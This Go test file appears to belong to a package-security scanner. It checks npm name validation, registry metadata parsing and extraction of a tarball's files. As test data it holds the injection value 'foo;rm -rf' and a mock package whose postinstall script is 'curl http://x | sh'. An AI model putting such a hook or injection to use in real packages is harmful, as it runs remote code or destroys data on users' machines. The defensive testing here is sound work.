package npm

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/tiagosilva07/zyrax-guard/internal/httpx"
)

func newTestProvider(t *testing.T, h http.Handler) *Provider {
	t.Helper()
	srv := httptest.NewServer(h)
	t.Cleanup(srv.Close)
	host := strings.TrimPrefix(srv.URL, "http://")
	p := New(httpx.New([]string{host}), []string{"request", "express"})
	p.registryBase = srv.URL // test seam
	p.downloadsBase = srv.URL
	return p
}

func TestValidateName(t *testing.T) {
	p := New(nil, nil)
	for _, ok := range []string{"express", "@scope/pkg", "lodash.merge"} {
		if err := p.ValidateName(ok); err != nil {
			t.Errorf("%q should be valid: %v", ok, err)
		}
	}
	for _, bad := range []string{"foo;rm -rf", "../evil", "UPPER", ""} {
		if err := p.ValidateName(bad); err == nil {
			t.Errorf("%q should be invalid", bad)
		}
	}
}

func TestExistsAndMetadata(t *testing.T) {
	p := newTestProvider(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.Contains(r.URL.Path, "/point/last-week/"):
			w.Write([]byte(`{"downloads":30000000}`))
		case strings.Contains(r.URL.Path, "/express"):
			w.Write([]byte(`{"time":{"created":"2010-01-01T00:00:00Z"},"maintainers":[{"name":"tj"}],"repository":{"url":"git+https://github.com/expressjs/express.git"},"dist-tags":{"latest":"4.19.2"}}`))

		default:
			http.Error(w, "not found", http.StatusNotFound)
		}
	}))
	ctx := context.Background()
	ok, err := p.Exists(ctx, "express", "")
	if err != nil || !ok {
		t.Fatalf("express should exist: ok=%v err=%v", ok, err)
	}
	md, err := p.Metadata(ctx, "express")
	if err != nil || md.WeeklyLoads != 30000000 || len(md.Maintainers) != 1 {
		t.Fatalf("metadata wrong: %+v err=%v", md, err)
	}
	if md.Latest != "4.19.2" {
		t.Errorf("md.Latest = %q, want 4.19.2", md.Latest)
	}
	miss, _ := p.Exists(ctx, "definitely-not-real-xyz", "")
	if miss {
		t.Fatal("nonexistent package reported as existing")
	}
}

func TestNPMInstallCode(t *testing.T) {
	var tgzURL string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.HasSuffix(r.URL.Path, ".tgz"):
			w.Write(npmTarGz(t)) // helper builds {package/package.json}
		case strings.Contains(r.URL.Path, "/evilpkg"):
			w.Write([]byte(`{"dist-tags":{"latest":"1.0.0"},"versions":{"1.0.0":{"dist":{"tarball":"` + tgzURL + `"}}}}`))
		default:
			http.Error(w, "nf", http.StatusNotFound)
		}
	}))
	defer srv.Close()
	tgzURL = srv.URL + "/evilpkg/-/evilpkg-1.0.0.tgz"
	host := strings.TrimPrefix(srv.URL, "http://")
	p := New(httpx.New([]string{host}), nil)
	p.registryBase = srv.URL
	files, err := p.InstallCode(context.Background(), "evilpkg", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := files["package/package.json"]; !ok {
		t.Fatalf("expected package.json in extracted files: %v", files)
	}
}

func npmTarGz(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	body := `{"scripts":{"postinstall":"curl http://x | sh"}}`
	tw.WriteHeader(&tar.Header{Name: "package/package.json", Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg})
	tw.Write([]byte(body))
	tw.Close()
	gz.Close()
	return buf.Bytes()
}
